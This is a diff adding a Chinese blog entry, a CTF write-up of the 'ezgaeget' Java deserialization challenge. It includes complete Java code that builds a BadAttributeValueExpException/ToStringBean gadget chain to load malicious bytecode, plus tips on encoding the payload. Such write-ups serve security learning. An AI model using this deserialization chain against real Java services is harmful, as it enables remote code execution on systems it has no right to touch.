@@ -4528,4 +4528,28 @@
         <category>java</category>
       </categories>
   </entry>
+  <entry>
+    <title>周题</title>
+    <url>/2022/03/18/%E5%91%A8%E9%A2%98/</url>
+    <content><![CDATA[<h3 id="ezgaeget（东华杯）"><a href="#ezgaeget（东华杯）" class="headerlink" title="ezgaeget（东华杯）"></a>ezgaeget（东华杯）</h3><p>本题是一道关于java反序列化的题目</p>
+<p>题目有一个jar包,通过Java Decompiler打开,查看里面的类,发现一个类ToStringBean,它的toString方法不但能从字节码加载类,并且还能帮助类继续实例化,所以这就是代码执行的地方了,想办法将ClassByte换成恶意类的字节码即可</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220318151601653.png" alt="image-20220318151601653"></p>
+<p>并且在IndexController这个Controller类中发现了能进行反序列化的地方</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220318151834640.png" alt="image-20220318151834640"></p>
+<p>java中ObjectInputStream.readObject其实就是反序列化的方法</p>
+<p>所以现在思路确定下来,首先构造恶意类,让其中的readObject可以调用参数的toString方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//首先通过字节码获取对应类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\javaSecurity\\cc\\target\\test-classes\\test.class&quot;</span>));</span><br><span class="line">        ToStringBean toStringBean = <span class="keyword">new</span> ToStringBean();</span><br><span class="line">        Class&lt;? extends ToStringBean&gt; toStringBeanClass = toStringBean.getClass();</span><br><span class="line">        Field classByte = toStringBeanClass.getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        classByte.set(toStringBean,bytes);</span><br><span class="line">        <span class="comment">//现在代码执行的地方已经封装好了,接下来就是构造反序列化时候能调用toString,恰好BadAttributeValueExpException的readObject会调用toString</span></span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//此处有个坑,就是BadAttributeValueExpException的构造方法会先执行toString,所以通过反射在实例化后再次修改</span></span><br><span class="line">        Class&lt;? extends BadAttributeValueExpException&gt; badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();</span><br><span class="line">        Field val = badAttributeValueExpExceptionClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,toStringBean);</span><br><span class="line">        <span class="comment">//构造完成,接下来只需要构造base64编码的字节流</span></span><br><span class="line">        </span><br><span class="line">        ByteOutputStream byteOutputStream=<span class="keyword">new</span> ByteOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(byteOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes1=byteOutputStream.toByteArray();</span><br><span class="line">        </span><br><span class="line">        System.out.println(Tools.base64Encode(bytes1));</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>起初没有保证序列化之前的包名一致,导致无法正常反序列化,反序列化的时候必须保证反序列化的类所在的包名一样</p>
+<p>还有一个坑点,就是base64在传的时候,记得先urlencode一次,防止将+当成空格去传,但是解码的时候又把空格当成base64来解码,所以会报<code>Illegal base64 character 20</code>错误</p>
+<p>传入data为打印出的字符串,成功执行代码</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
 </search>
